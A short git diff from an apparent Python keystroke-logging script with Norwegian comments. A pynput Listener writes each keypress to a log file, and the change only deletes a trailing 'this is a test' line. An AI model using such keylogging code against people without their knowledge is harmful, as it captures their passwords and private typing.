@@ -49,7 +49,3 @@ def update_log_file():
 # Samler hendelser til det stoppes
 with Listener(on_press=write_to_file) as l:
     l.join()
-
-
-Dette er en test
-
